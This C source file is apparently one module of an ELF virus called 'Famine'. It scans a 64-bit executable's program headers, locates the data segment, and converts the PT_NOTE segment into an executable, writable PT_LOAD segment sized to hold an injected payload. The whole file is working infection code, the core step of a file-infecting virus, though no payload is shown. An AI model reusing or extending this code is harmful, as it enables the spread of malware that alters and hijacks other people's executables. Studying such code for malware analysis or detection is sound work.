#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline Elf64_Phdr *get_segment(const struct s_info *info, Elf64_Half index)
{
	Elf64_Phdr *ret;

	ret = (Elf64_Phdr *)((void *)info->ptr + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)ret >= info->ptr + info->size)
		Exit(0);

	return ret;
}

static inline bool is_note_segment(const Elf64_Phdr *segment)
{
	return segment->p_type == PT_NOTE;
}

static inline bool is_data_segment(const Elf64_Phdr *segment)
{
	if (segment->p_type != PT_LOAD)
		return false;

	return segment->p_flags == (PF_W | PF_R);
}

static Elf64_Phdr *get_note_segment(Elf64_Phdr *segment, struct s_info *info)
{
	const size_t add_padding = (info->data->p_vaddr + info->data->p_memsz) % info->data->p_align;
	const size_t off_padding = info->data->p_align - ((info->data->p_offset + info->data->p_filesz) % info->data->p_align);

	segment->p_filesz = PAYLOAD_SIZE;
	segment->p_memsz = PAYLOAD_SIZE;

	segment->p_type = PT_LOAD;
	segment->p_flags = (PF_X | PF_W | PF_R);
	segment->p_align = info->data->p_align;

	segment->p_vaddr = ((info->data->p_vaddr + info->data->p_memsz) + (info->data->p_align - add_padding));
	segment->p_offset = ((info->data->p_offset + info->data->p_filesz) + off_padding);

	return segment;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void modify_segment(struct s_info *info)
{
	const Elf64_Ehdr *header = (const Elf64_Ehdr *)info->ptr;
	Elf64_Phdr *segment;

	for (Elf64_Half index = 0; index < header->e_phnum; index++)
	{
		segment = get_segment(info, index);

		if (is_data_segment(segment) == true)
			info->data = segment;
		if (is_note_segment(segment) == true)
			info->note = get_note_segment(segment, info);
	}
}
